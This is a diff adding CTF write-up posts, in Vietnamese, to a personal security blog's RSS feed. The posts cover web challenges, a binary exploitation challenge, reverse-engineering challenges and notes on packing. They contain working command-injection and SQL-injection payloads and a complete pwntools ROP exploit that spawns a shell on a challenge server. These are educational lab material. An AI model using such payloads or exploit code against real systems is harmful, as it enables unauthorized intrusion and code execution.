@@ -4,5 +4,1950 @@
         <link>https://cr0nica1.github.io/posts/</link>
         <description>All Posts | Cr0nica1</description>
         <generator>Hugo -- gohugo.io</generator><language>en-us</language><managingEditor>minhtoanlamson2005@gmail.com (cr0nica1)</managingEditor>
-            <webMaster>minhtoanlamson2005@gmail.com (cr0nica1)</webMaster><lastBuildDate>Wed, 16 Apr 2025 04:02:58 &#43;0700</lastBuildDate><atom:link href="https://cr0nica1.github.io/posts/" rel="self" type="application/rss+xml" /></channel>
+            <webMaster>minhtoanlamson2005@gmail.com (cr0nica1)</webMaster><lastBuildDate>Wed, 16 Apr 2025 04:02:58 &#43;0700</lastBuildDate><atom:link href="https://cr0nica1.github.io/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>Dreamhack Web Wargame</title>
+    <link>https://cr0nica1.github.io/posts/dhweb/</link>
+    <pubDate>Wed, 16 Apr 2025 04:02:58 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/dhweb/</guid>
+    <description><![CDATA[<p>Sau một thời gian dài cùng với các mảng CTF về ngôn ngữ low-level, mình nghĩ rằng đã đến lúc mình cần một cái gì đó mới mẻ hơn, offensive hơn và web là lựa chọn đó. Ở đây mình sẽ chỉ sưu tầm những chall mình đánh giá là hay, có thể nó không khó nhưng bổ sung cho mình nhiều điều mới mẻ.</p>
+<h2 id="ez_command_injection">EZ_command_injection</h2>
+<h3 id="1-recon">1. Recon</h3>
+<p>Check mã nguồn Web có 2 endpoint là &lsquo;/&rsquo;, &lsquo;/ping&rsquo;. Khi gửi request &lsquo;GET&rsquo; đến endpoint &lsquo;/ping&rsquo; thì chương trình sẽ đọc IP là giá trị của biến host, sau đó gọi lệnh hệ thống để ping.</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+import subprocess
+import ipaddress
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+    return render_template(&#39;index.html&#39;)
+
+@app.route(&#39;/ping&#39;, methods=[&#39;GET&#39;])
+def ping():
+    host = request.args.get(&#39;host&#39;, &#39;&#39;)
+    try:
+        addr = ipaddress.ip_address(host)
+    except ValueError:
+        error_msg = &#39;Invalid IP address&#39;
+        print(error_msg)
+        return render_template(&#39;index.html&#39;, result=error_msg)
+
+    cmd = f&#39;ping -c 3 {addr}&#39;
+    try:
+        output = subprocess.check_output([&#39;/bin/sh&#39;, &#39;-c&#39;, cmd], timeout=8)
+        return render_template(&#39;index.html&#39;, result=output.decode(&#39;utf-8&#39;))
+    except subprocess.TimeoutExpired:
+        error_msg = &#39;Timeout!!!!&#39;
+        print(error_msg)
+        return render_template(&#39;index.html&#39;, result=error_msg)
+    except subprocess.CalledProcessError:
+        error_msg = &#39;An error occurred while executing the command&#39;
+        print(error_msg)
+        return render_template(&#39;index.html&#39;, result=error_msg)
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=8000)
+</code></pre><h3 id="2-analysis">2. Analysis</h3>
+<p>Như mã nguồn được biết, server sau khi nhận request sẽ đẩy ip (giá trị tham số host) vào biến host, sau đó dùng hàm ipaddress.ip_address() để xác định ip hợp lệ trước khi chạy lệnh ping. Như vậy gần như không thể command injection vào bên trong biến host. Tuy nhiên thì thực ra vẫn có cách để bypass cơ chế này.</p>
+<p></p>
+<p>Theo tài liệu python, ipaddress.ip_address() sẽ lấy chính xác địa chỉ ip đúng định dạng, tuy nhiên ipv6 có một cơ chế tên là Zone Identifier. Zone Identifier dùng để xác định chính xác loại Interface sử dụng để gửi gói tin trong link-local. Tuy nhiên nếu như chúng ta chèn thêm phía sau Zone Identifer và url_encode thì python sẽ không thể nhận ra ip không hợp lệ, điều này giúp chúng ta đạt được RCE.</p>
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p>Sử dụng burp pro để điều chỉnh GET request tới server.</p>
+<p></p>
+<p>Như mình đề cập ở trên, phần Zone Identifier sẽ mắc theo cả phần string phía sau nên mình sẽ lợi dụng điều này chèn command &lsquo;cat flag.txt&rsquo;. Như vậy payload mình chèn vào sẽ là:</p>
+<p><code>fe80::1%eth0 &amp; cat flag.txt &amp;</code>
+Mình không chắc chắn cách server xử lý nên để chắc ăn mình sẽ encode nó lại theo url encode. Gửi request và thu được flag.</p>
+<p></p>
+<h3 id="4-reference">4. Reference</h3>
+<ul>
+<li><a href="https://docs.python.org/3/library/ipaddress.html#module-ipaddress" target="_blank" rel="noopener noreffer ">https://docs.python.org/3/library/ipaddress.html#module-ipaddress</a></li>
+<li><a href="https://datatracker.ietf.org/doc/html/rfc6874" target="_blank" rel="noopener noreffer ">https://datatracker.ietf.org/doc/html/rfc6874</a></li>
+</ul>
+<h2 id="baby-sqlite">baby-SQLite</h2>
+<h3 id="1-recon-1">1. Recon</h3>
+<p>Web có 2 endpoint &lsquo;/&rsquo;, &lsquo;/login&rsquo;. Khi đăng nhập thì client sẽ gửi một POST request thông tin về uid,upw lên server. Server trả về flag nếu uid=&lsquo;admin&rsquo;.</p>
+<h3 id="2-analysis-1">2. Analysis</h3>
+<p>Đọc mã nguồn server, mình nhận thấy câu lệnh truy vấn của phía server có tận 3 tham số uid,upw và level. Như vậy nếu như mình thêm tham số level vào request thì mình có thể ghi đè thoải mái vào level. Tuy nhiên server lại có filter để tránh tình trạng đó.</p>
+<p><code>sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '&quot;', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']</code></p>
+<p>Như vậy việc dùng SELECT để SQLi UNION-based gần như là không thể. Sau khi mình tìm hiểu thì còn một cách khác là UNION VALUES trong SQLite. Bên cạnh đó thì &lsquo;admin&rsquo; cũng bị filter nên mình sẽ chuyển từ các giá trị ascii về ký tự bằng hàm char.</p>
+<h3 id="3-exploitaiton">3. Exploitaiton</h3>
+<p>Dựa trên những phân tích này, mình xây dựng được payload.
+<code>0/**/UNION/**/VALUES(char(97)||char(100)||char(109)||char(105)||char(110))</code></p>
+<p>Tiêm payload vào parameter level gửi đến server.</p>
+<p></p>
+<p>Server trả về flag như mong đợi.</p>
+<p></p>
+<ul>
+<li>NOTE: về SQLite Mình có bảng tham khảo lệnh truy vấn.</li>
+</ul>
+<p></p>
+<h2 id="wargamekr-adm1nkyj">[wargame.kr] adm1nkyj</h2>
+<h3 id="1-recon-2">1. Recon</h3>
+<p>Trang web cho biết mã nguồn PHP của server khi truy cập vào. Khi server nhận đúng 3 giá trị id,pw và flag, server sẽ trả về flag thật cho chúng ta. Nếu không sẽ thực thi <code>echo &quot;Hello &quot;.$query[$id_column].&quot;&lt;hr&gt;&quot;;</code>.</p>
+<h3 id="2-analysis--exploitation">2. Analysis &amp; Exploitation</h3>
+<p>Đọc query chính của server:
+<code>$query = mysql_fetch_array(mysql_query(&quot;SELECT * FROM findflag_2 WHERE $id_column='{$id}' and $pw_column='{$pw}';&quot;));</code></p>
+<p>nếu chúng ta ghi đè vào tham số id để truy vấn &ldquo;SELECT * FROM findflag_2&rdquo; luôn đúng thì có thể chúng ta lấy được giá trị trong cột lưu trong biến $id_column. Đơn giản nhất là <code>OR 1=1</code>.</p>
+<p></p>
+<p></p>
+<p>Lấy được 1 giá trị trong cột là &lsquo;adm1ngnngn&rsquo;, có vẻ là 1 giá trị mình cần tìm vì có liên quan đến admin.</p>
+<p>Tuy nhiên thì do chỉ in ra giá trị $id_column trong query nên chúng ta không thể leak các cột $pw_column bằng UNION-based thông thường.</p>
+<p>Chúng ta nhìn lại logic lấy query.</p>
+<pre tabindex="0"><code>$query = mysql_fetch_array(mysql_query(&#34;SELECT * FROM findflag_2 WHERE $id_column=&#39;{$id}&#39; and $pw_column=&#39;{$pw}&#39;;&#34;));
+</code></pre><p>và</p>
+<pre tabindex="0"><code>echo &#34;Hello &#34;.$query[$id_column].&#34;&lt;hr&gt;&#34;
+</code></pre><p><code>$query[$id_column]</code> sẽ trả về giá trị mà <code>$id_column</code> so sánh với trong query, tuy nhiên thì nếu như query có lệnh so sánh <code>$id_column</code> không trả về bất kỳ thứ gì thì nó sẽ lấy giá trị query trả về.</p>
+<p>Bên cạnh đó, biến <code>$pw_column</code> lại chứa tên cột của pw. Vậy nếu ép query trả về <code>$pw_column</code> thì <code>$query[$id_column]=$pw_column</code>. Thử thì nhìn thấy ở cột thứ 2 của query mới hiển thị trên response về client nên chúng ta xây dựng được payload.</p>
+<pre tabindex="0"><code>?id=&#39;+and+0+union+select+1,&amp;pw=3,4,5--+-
+</code></pre><p>Query lúc đó sẽ trở thành:</p>
+<pre tabindex="0"><code>SELECT * FROM findflag_2 WHERE $id_column=&#39;&#39; and 0 union select 1, &#39;and $pw_column=&#39;,3,4,5;
+</code></pre><p>Gửi request đến server và nhận response:
+</p>
+<p>Như vậy <code>$pw_column=xPw4coaa1sslfe</code>. Biết được tên cột rồi thì mình cần query để dò giá trị mật khẩu của admin.</p>
+<p>Cũng cùng kỹ thuật trên, chúng ta sẽ ép cho truy vấn gốc bị vô hiệu để <code>$query[$id_column]</code> sẽ trả về giá trị thu được từ query. Biết được tên column rồi thì chúng ta thực hiện truy vấn với payload sau.</p>
+<p><code>?id='+and+0+union+select+1,(select+xPw4coaa1sslfe+from+findflag_2),3,4,5--+-</code></p>
+<p></p>
+<p>Thử gửi request với giá trị tài khoản và mật khẩu thu được.</p>
+<p></p>
+<p>Response trả về cho thấy id và pw đã đúng. Điều tiếp theo mình cần tìm là flag. Flag được lưu trong hẳn 1 column tên là flag_column. Do vậy mình vẫn cần dựa vào truy vấn để tìm flag. Trước tiên thì chúng ta vẫn không biết chính xác tên cột flag để gọi truy vấn, tuy nhiên truy vấn gốc cho ta biết rằng có 5 cột nên mình sẽ thay phiên dump giá trị 5 cột đó ra. Ý tưởng sẽ là tạo một bảng ảo bằng subquery với dòng đầu tiên là ảo, dòng thứ 2 sẽ là giá trị dump từ findflag_2. Thử query tất cả các vị trí của bảng ảo này thì mình tìm thấy được <code>$flag_column</code> nằm ở cột 4. Như vậy mình chỉ cần lấy giá trị truy vấn dòng thứ 2 của bảng ảo cột 4:</p>
+<p></p>
+<p>Payload:<code>?id='+and+0+union+select+1,flag,3,4,5+from+(select+1,2,3,4+as+flag,5+union+select+*+from+findflag_2+LIMIT+1,1)x--+-</code></p>
+<p>Gửi request có cả id,pw và flag đến server để nhận được đáp án.</p>
+<p></p>
+<h3 id="3-conclusion">3. Conclusion</h3>
+<p>Bản thân mình nhận thấy đây là một chall rất hay khi yêu cầu một chút khả năng hiểu logic lỗi của code PHP. Mấu chốt nằm ở việc lấy được giá trị <code>$pw_column</code> để tìm mật khẩu.</p>
+]]></description>
+</item>
+<item>
+    <title>Dreamhack CTF Season 7 Round #5 (🚩Div1)</title>
+    <link>https://cr0nica1.github.io/posts/dhctf%237r5/</link>
+    <pubDate>Wed, 16 Apr 2025 03:57:40 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/dhctf%237r5/</guid>
+    <description><![CDATA[<p>Giải này diễn ra tình cờ vào thời điểm mình vừa xong đợt trainning CTF nên có thời gian rảnh thử sức. Tuy nhiên bằng một cách thần kỳ nào đó mình lỡ bài rev khá tiếc mà giải được câu pwn này.</p>
+<h2 id="chat-with-me---binary-exploitation">Chat with Me - Binary exploitation</h2>
+<h3 id="i-vulnerability">I. Vulnerability</h3>
+<p></p>
+<p></p>
+<p>Checksec và đọc Pseudocode trong IDA có NX, không có PIE và canary và có một lỗi buffer overflow:</p>
+<pre tabindex="0"><code>_QWORD buf[97];
+memset(buf, 0, 0x300uLL);
+v12 = read(v13, buf, 0x600uLL);
+</code></pre><p>Do chương trình có NX, vì vậy hướng tiếp cận sẽ không phải là ret2shellcode.</p>
+<h3 id="ii-exploitation">II. Exploitation</h3>
+<p>Chương trình sử dụng nhiều hàm gọi từ libc trước khi yêu cầu nhập vào bộ đệm, đồng thời cho nhập tận 0x600 byte. Do vậy ý tưởng sẽ là leak giá trị từ bảng GOT và tìm libc_base. Đọc trong stack trên IDA, cần phải padding 840 byte thì chúng ta sẽ đến ret_address, thử nhập 848 byte để kiểm tra trong GDB:
+</p>
+<p>Như vậy là chúng ta đã ghi đè được, tiếp đến chúng ta cần tìm các gadget để gọi hàm read, biết rằng fd của chúng ta là 4.
+</p>
+<p>Có sẵn một gadget rất đẹp ở đây. Tuy nhiên ở đây thì mình sợ rằng việc overflow sẽ khiến một vài hàm đặc biệt kiểm tra tình trạng kết nối làm mất connection nên để an toàn mình stack pivot sang một vùng có quyền rw, và do cũng không có PIE nên mình dễ dàng bổ sung vào payload các gadget để stack pivot và thực hiển read một lần nữa. Mình tìm thêm gadget pop_rbp và gadget leave_ret. Payload đầu tiên để leak libc_base và yêu cầu hàm read thêm 1 lần nữa.</p>
+<pre tabindex="0"><code>payload=b&#39;A&#39;*840
+payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
+payload+=p64(elf.plt[&#39;send&#39;])
+payload+=p64(pop_rbp)+p64(0x404900)
+payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
+payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
+</code></pre><p>Bình thường thì đến đây sẽ khá đơn giản vì payload thứ 2 là gọi system(&rsquo;/bin/sh&rsquo;). Tuy nhiên điều phức tạp ở đây là fd của chúng ta là 4, còn shell tương tác với stdin và stdout ở fd=0 và fd=1. Chúng ta cần ép nó về fd=4:</p>
+<pre tabindex="0"><code>dup2(4,0);
+dup2(4,1);
+</code></pre><h3 id="iii-script">III. Script</h3>
+<pre tabindex="0"><code>from pwn import *
+context.binary=elf=ELF(&#39;./chall&#39;,checksec=False)
+libc=ELF(&#39;./libc.so.6&#39;,checksec=False)
+gadget=0x0000000000401396
+pop_rbp=0x40137d
+push_rsp=0x207768
+leave_ret=0x4016ca
+
+p=remote(&#39;host3.dreamhack.games&#39;,20267)
+p.recvuntil(b&#39;Welcome to the TCP Chat Server!\n&#39;)
+
+payload=b&#39;A&#39;*840
+payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
+payload+=p64(elf.plt[&#39;send&#39;])
+payload+=p64(pop_rbp)+p64(0x404900)
+payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
+payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
+p.send(payload)
+
+leak=u64(p.recvn(8))
+log.info(f&#39;leak: {hex(leak)}&#39;)
+lib_base=leak-libc.sym[&#39;puts&#39;]
+lib_system=lib_base+libc.sym[&#39;system&#39;]
+log.info(f&#39;lib base: {hex(lib_base)}&#39;)
+
+payload=p64(0)+p64(gadget+2)+p64(0)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
+payload+=p64(gadget+2)+p64(1)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
+payload+=p64(gadget+3)+p64(lib_base+next(libc.search(b&#39;/bin/sh&#39;)))+p64(gadget+4)+p64(lib_system)
+
+p.send(payload)
+p.interactive()
+</code></pre><h1 id="iv-reference">IV. Reference</h1>
+<p><a href="https://dreamhack.io/ctf/659" target="_blank" rel="noopener noreffer ">https://dreamhack.io/ctf/659</a></p>
+]]></description>
+</item>
+<item>
+    <title>Research: Packing và Unpacking trong reverse engineering</title>
+    <link>https://cr0nica1.github.io/posts/research/</link>
+    <pubDate>Wed, 16 Apr 2025 03:43:12 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/research/</guid>
+    <description><![CDATA[<blockquote>
+<p>SLIDE bài thuyết trình: <a href="https://www.canva.com/design/DAGiMR6Qp0U/OkIupXHYFkij3xmruojTrQ/edit?utm_content=DAGiMR6Qp0U&amp;utm_campaign=designshare&amp;utm_medium=link2&amp;utm_source=sharebutton" target="_blank" rel="noopener noreffer ">https://www.canva.com/design/DAGiMR6Qp0U/OkIupXHYFkij3xmruojTrQ/edit?utm_content=DAGiMR6Qp0U&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton</a></p></blockquote>
+<p>Packing là một trong những kỹ thuật cơ bản về bảo vệ file. Đối với các reverser, unpacking là công cụ đắc lực để vượt qua kỹ thuật anti-reverse khá mạnh mẽ này. Hầu hết mọi thứ về phương pháp phân tích thì đều có ở trong slide trên, bài viết này của mình sẽ chỉ tóm tắt lại ý chính từ bài thuyết trình.</p>
+<h2 id="1-tổng-quan-về-packing-và-unpacking">1. Tổng quan về packing và unpacking.</h2>
+<ul>
+<li>Packing: Việc nén, che giấu mã thực thi gốc của chương trình.</li>
+<li>Packer: Chương trình packing file thực thi nhằm che giấu mã thực thi gốc.</li>
+</ul>
+<p>Packed File:</p>
+<ul>
+<li>File thực thi mà mã thực thi gốc đã bị pack bởi packer - nghĩa là mã thực thi gốc đã bị ẩn đi khi load vào các trình disassembler để
+phân tích và lưu lại.</li>
+<li>Được packing bằng các kỹ thuật như nén, mã hóa, tự động bổ sung một hoặc nhiều section và đoạn unpacking stub, cuối cùng là packed data. Mã thực thi gốc của chương trình nằm trong packed data.</li>
+</ul>
+<p>Mục đích của việc pack các file thực thi: Như các kỹ thuật obfuscating khác, việc pack file thực thi nhằm gây khó khăn hơn đối với các reverser trong việc phân tích và đảo ngược chương trình.Đối với malware, việc pack file khiến cho các trình Anti-virus (AV) khó khăn trong việc xác định nó. Các AV thông thường sẽ quét tuyến tính file PE từ đầu đến cuối của file theo cấu trúc file. Tuy nhiên việc pack đã chèn thêm nhiều section &lsquo;&lsquo;rác&rsquo;&rsquo;, các section rác này bị AV nhận diện là vô hại. Mã thực thi gốc có hại lại nằm bên trong Packed Data. Dữ liệu bên trong Packed Data chỉ bị giải nén khi chương trình được khởi chạy (runtime).</p>
+<h2 id="2-nguyên-lý-hoạt-động-của-packing">2. Nguyên lý hoạt động của packing</h2>
+<ul>
+<li>Khi file bị packed, các giá trị bên trong các section sẽ bị nén, mã hóa để che giấu khỏi reverser.</li>
+<li>Packer sẽ thêm các unpacking stub và các section rác vào. Các unpacking stub sẽ khôi phục lại mã thực thi gốc, trạng thái các thanh ghi và dẫn luồng chương trình đến Original entry point của phần mã thực thi đó.</li>
+<li>Khi chương trình thực thi, sau khi load xong hết các phần ở trên thì Instruction Pointer sẽ nhảy đến entry point của chương trình nằm trong Unpacking stub. Các unpacking stub này có nhiệm vụ khôi phục lại mã thực thi gốc, khôi phục lại trạng thái các thanh ghi. Sau khi giải mã/ giải nén mã thực thi gốc xong, trong unpacking stub sẽ có lệnh chuyển hướng vào original entry point (OEP) của đoạn mã thực thi được giải nén.</li>
+<li>Sau đó, chương trình nhảy đến Original Entry Point của vùng mã được giải nén, khôi phục giá trị các thanh ghi (nếu có) và thực thi chương trình như bình thường.</li>
+</ul>
+<h2 id="3-phương-pháp-phân-tích-và-unpack-file-bị-nén">3. Phương pháp phân tích và unpack file bị nén</h2>
+<blockquote>
+<p>Nội dung phần này và toàn bộ Demo mình đã trình bày rõ trong slide bên trên.</p></blockquote>
+]]></description>
+</item>
+<item>
+    <title>squ1rrel CTF 2025</title>
+    <link>https://cr0nica1.github.io/posts/squirrel/</link>
+    <pubDate>Wed, 16 Apr 2025 03:39:19 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/squirrel/</guid>
+    <description><![CDATA[<p>squ1rrel là một giải khá ít challenge rev, chỉ có 3 bài. Mình tham gia giải này song song Breach nên cũng chỉ kịp đóng góp cho team 1 bài.</p>
+<h2 id="intermediate-software-design---reverse-engineering">Intermediate Software Design - reverse engineering</h2>
+<h3 id="1-static-analysis">1. Static Analysis</h3>
+<p>Chương trình chỉ gồm có duy nhất 1 hàm main, nhận input và xử lý nó. Logic xử lý của chương trình lại không quá phức tạp, nó chủ yếu nằm ở đoạn sau.</p>
+<p></p>
+<p>Có một lưu ý nhỏ ở đây, chương trình đọc input thành một mảng các ký tự, mỗi ký tự là 4 byte. Ở vòng lặp đầu tiên, con trỏ v3 di chuyển dọc theo mảng ký tự input, rồi lấy kết quả thực hiện xor với kết quả trong &amp;v23.Tuy nhiên, con trỏ v3 lại là con trỏ (_DWORD), mà mảng ký tự đọc vào là các mảng ký tự 4 byte nên phép xor này chỉ ảnh hưởng đến các ký tự lẻ. Chúng ta có thể thấy rõ như sau.</p>
+<p></p>
+<p></p>
+<p>Như vậy sau loop thứ nhất sẽ thực hiện phép xor giữa các phần tử lẻ của chuỗi và constant tại &amp;v23.</p>
+<p>Ở vòng lặp thứ 2, chương trình lặp qua string sau khi bị biến đổi và thực hiện phép toán vs các constant được lưu sẵn.</p>
+<p></p>
+<p>Có một điều đáng lưu ý là v13 là bộ đếm để lấy giá trị tại v21, tuy nhiên v13 cũng chính là bộ đếm ở vòng lặp trên và nó không hề đặt lại về 0 khi vào vòng lặp này nên v13 sẽ bắt đầu từ số phần tử lẻ của input.</p>
+<p>Từ phân tích trên, ta chỉ cần lấy constant cần thiết vào và viết script reverse lại là xong.</p>
+<h3 id="2-reversing">2. Reversing</h3>
+<p></p>
+<p>Output chứa ký tự không in được nên mình sẽ lấy giá trị hex ở đây. Đồng thời dễ nhận thấy output có độ dài là 26 nên v13 sẽ bắt đầu từ vị trí 13 ở vòng lặp thứ 2. Mình chạy script reverse và thu được.</p>
+<p></p>
+<h3 id="3-script">3. Script</h3>
+<pre tabindex="0"><code>v21=[3, 3, 1, 5, 50, 8, 1, 9,
+ 5, 7, 9, 3, 2, 2, 6, 8,
+ 5, 30, 6, 3, 3, 1, 5, 4,
+ 8, 1, 9, 5, 7, 2, 3, 2,
+ 2, 6, 8, 5, 4, 6, 3, 3,
+ 1, 5, 4, 8, 1, 9, 5, 7,
+ 9, 3, 2, 2, 6, 8, 5, 4,
+ 6, 3, 3, 1, 5, 4, 8, 1,
+ 9, 5, 7, 9, 3, 2, 2, 6,
+ 8, 5, 4, 6]
+
+n=[0x2a,0x51,0x63,0x4d,0x22,0x5c,0x37,0x7e,0x00]
+
+output=&#39;\x59\x75\x2a\x34\x2d\x76\x29\x6d\x58\x7a\x6a\x7a\x73\x6f\x24\x7e\x30\x76\x58\x5f\x26\x5a\x09\x72\x42\x7e&#39;
+print(len(output))
+res=[]
+for i in range(len(output)):
+    res.append(ord(output[i])-v21[i+13]+2)
+c=[]
+for i in range(len(res)):
+    if i%2==0:
+        c.append(res[i]^n[(i//2)%9])
+    else:
+        c.append(res[i])
+m=&#39;&#39;
+for i in c:
+    m+=chr(i)
+print(m)
+</code></pre>]]></description>
+</item>
+<item>
+    <title>Breach CTF 2025</title>
+    <link>https://cr0nica1.github.io/posts/breach/</link>
+    <pubDate>Wed, 16 Apr 2025 03:30:40 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/breach/</guid>
+    <description><![CDATA[<p>Breach có lẽ là giải khá khó chịu với mình vì không có nhiều chall thuần về reversing logic và xác định luồng truyền thống, mặt khác nó lại có phần tricky ở nhiều chall. Ở giải này chỉ có mình mình giải 1 chall.</p>
+<h2 id="fraction-fun---rev">Fraction Fun - rev</h2>
+<h3 id="1-analysis">1. Analysis</h3>
+<p>Chall cho biết file mã nguồn của chương trình xác thực trên server. Cần phải nhập chính xác số cần nhập để sau các phép biến đổi, kết quả sẽ bằng kết quả trong output.txt. Logic chương trình khá đơn giản, chỉ là vòng lặp sau.</p>
+<pre tabindex="0"><code>for _ in range(1000):
+    changed = False
+    for i in range(len(a)):
+        if inp % b[i] == 0:
+            inp = inp * a[i] // b[i]
+            changed = True
+    if not changed:
+        broken = True
+        break
+</code></pre><p>Đối với đoạn logic đơn giản này, chúng ta chỉ đơn giản là viết script đảo ngược phép logic này là được.</p>
+<h3 id="2-reversing">2. Reversing</h3>
+<p>Đoạn mã đảo ngược logic dễ dàng đạt được bằng cách thực hiện ngược lại các phép toán biến đổi trên:</p>
+<pre tabindex="0"><code>for _ in range(1000):
+        changed = False
+        
+        for i in reversed(range(len(a))):
+            ai = a[i]
+            bi = b[i]
+            if current % ai == 0:
+                current = current * bi // ai
+                changed = True
+        if not changed:
+            broken = True
+            break
+</code></pre><p>Sử dụng đoạn mã này vào script thu được.
+</p>
+<p>Nhập vào và lấy flag.
+</p>
+<h3 id="3-script">3. Script</h3>
+<pre tabindex="0"><code>def reverse_execute(code, fin_output):
+    values = code.split(&#34; &#34;)
+    a = [int(i.split(&#34;/&#34;)[0]) for i in values]
+    b = [int(i.split(&#34;/&#34;)[1]) for i in values]
+    current = fin_output
+    broken = False
+    for _ in range(1000):
+        changed = False
+        
+        for i in reversed(range(len(a))):
+            ai = a[i]
+            bi = b[i]
+            if current % ai == 0:
+                current = current * bi // ai
+                changed = True
+        if not changed:
+            broken = True
+            break
+    if not broken:
+        print(&#34;Reverse loop did not terminate in 1000 iterations!&#34;)
+    return current
+
+code = open(&#34;code.txt&#34;, &#34;r&#34;).read().strip()
+fin_output = int(open(&#34;output.txt&#34;, &#34;r&#34;).read().strip())
+
+required_input = reverse_execute(code, fin_output)
+print(required_input)
+</code></pre>]]></description>
+</item>
+<item>
+    <title>Hackthebox: Cyber Apocalypse CTF 2025: Tales from Eldoria</title>
+    <link>https://cr0nica1.github.io/posts/htb/</link>
+    <pubDate>Wed, 16 Apr 2025 03:10:02 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/htb/</guid>
+    <description><![CDATA[<p>Như mọi khi, hackthebox luôn mang đến cho chúng ta giải CTF khá chất lượng về độ phân loại, phù hợp cho cả beginner và người đã có kinh nghiệm. Ở giải này những challenge easy và very easy đều quá dễ nên mình sẽ chỉ viết writeup challenge mức độ medium mình giải được.</p>
+<h1 id="writeup">Writeup</h1>
+<h2 id="singlestep---rev">Singlestep - rev</h2>
+<h3 id="1-static-analysis">1. Static Analysis</h3>
+<p>Load file vào IDA, chúng ta nhận thấy hàm hàm main call đến một hàm loc_5555555583E0 nào đấy. Vào trong hàm bên trong hàm này kiểm tra.</p>
+<p></p>
+<p>Ở bên trong này, chúng ta thấy một đoạn dài mã thực thi thuộc section .text mà IDA không đọc được code x64 asm. Nhìn vào các lệnh xor, mình nhận ra rằng chương trình sẽ giải mã các vùng mã không đọc được đó bằng xor, thực thi lệnh ở đó rồi lại xor lại để mã hóa 1 lần nữa. Do vậy đoạn mã này chỉ có thể đọc được trong runtime, không thể đọc được bằng cách disassemble thông thường. Cách duy nhất mình nghĩ được là lưu lại code được giải mã trong khi debug, tuy nhiên sẽ rất mất thời gian nên mình phải sử dụng script (được tài trợ bởi anh shynt_ :v) để lưu lại những đoạn code được deobfucasting trong khi chạy. Do mình quan tâm đến đoạn code từ sau khi nhập input nên mình sẽ deobfuscating kể từ đoạn yêu cầu nhập input. Lưu ý rằng trong tất cả các string được in ra màn hình, chỉ có duy nhất 1 string gọi printf là &ldquo;Please enter the ✨ secret ✨ bequeathed to his cult following:&rdquo;, do vậy script sẽ deobfuscating từ printf trong got.plt.</p>
+<pre tabindex="0"><code>import gdb
+
+gdb.execute(&#34;file singlestep&#34;)
+gdb.execute(&#34;break printf@plt&#34;)
+gdb.execute(&#34;run&#34;)
+
+log_file = open(&#34;log.txt&#34;, &#34;w&#34;)
+
+try:
+    while True:
+        gdb.execute(&#34;stepi&#34;, to_string=True)
+        output = gdb.execute(&#34;x/i $pc&#34;, to_string=True)
+        
+        if &#34;xor&#34; in output and (&#34;BYTE&#34; in output or &#34;WORD&#34; in output or &#34;DWORD&#34; in output):
+            continue
+
+        if &#34;nop&#34; in output:
+            continue
+
+        if &#34;pushfq&#34; in output:
+            continue
+
+        if &#34;popfq&#34; in output:
+            continue
+
+        if &#34;pushf&#34; in output:
+            continue
+
+        if &#34;popf&#34; in output:
+            continue
+
+        
+        # print(output.strip())
+        log_file.write(output)
+        log_file.flush()
+except KeyboardInterrupt:
+    print(&#34;&#34;)
+finally:
+    log_file.close()
+</code></pre><h3 id="2-dynamic-analysis">2. Dynamic analysis</h3>
+<p>Đặt breakpoint tại điểm đầu tiên của đoạn code được ghi lại bởi script trên. Tiếp tục sử dụng step into cho đến khi chương trình đọc input, nhập input rồi dừng lại.</p>
+<p></p>
+<p>Mình vào file log.txt, cắt script kể từ đoạn này cho đến khi chương trình gọi lệnh puts. Đây sẽ là phần logic chính của chương trình.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555b0a2:	mov    DWORD PTR [rbp-0x27c],eax
+=&gt; 0x55555555b0d9:	cmp    DWORD PTR [rbp-0x27c],0x0
+    → cmp operands: DWORD PTR [rbp-0x27c] = N/A, 0x0 = 0
+=&gt; 0x55555555b111:	js     0x55555555b2ba
+
+=&gt; 0x55555555b141:	mov    eax,DWORD PTR [rbp-0x27c]
+=&gt; 0x55555555b16e:	sub    eax,0x1
+=&gt; 0x55555555b18e:	cdqe
+=&gt; 0x55555555b1b1:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
+=&gt; 0x55555555b1da:	cmp    al,0xa
+    → cmp operands: $al = 10, 0xa = 10
+=&gt; 0x55555555b1fc:	jne    0x55555555b2ba
+
+=&gt; 0x55555555b22c:	mov    eax,DWORD PTR [rbp-0x27c]
+=&gt; 0x55555555b259:	sub    eax,0x1
+=&gt; 0x55555555b279:	cdqe
+=&gt; 0x55555555b29c:	mov    BYTE PTR [rbp+rax*1-0x210],0x0
+=&gt; 0x55555555b2d6:	lea    rax,[rbp-0x210]
+=&gt; 0x55555555b30b:	mov    rdi,rax
+=&gt; 0x55555555b333:	call   0x555555557690
